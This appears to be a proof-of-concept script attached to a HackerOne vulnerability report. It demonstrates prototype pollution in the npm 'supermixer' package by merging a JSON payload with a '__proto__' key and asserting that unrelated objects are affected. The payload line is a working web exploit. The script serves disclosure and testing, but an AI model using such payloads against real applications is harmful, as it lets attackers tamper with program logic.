https://hackerone.com/reports/959987

var mixer = require('supermixer');
const assert = require('assert');


var payload = '{"__proto__":{"polluted":"yes"}}';//payload
var test = {};
console.log("Before: ", test.polluted);
mixer.merge({},JSON.parse(payload));

console.log("After: ", test.polluted);
assert(test.polluted === "yes");
console.log("Payload success! ");
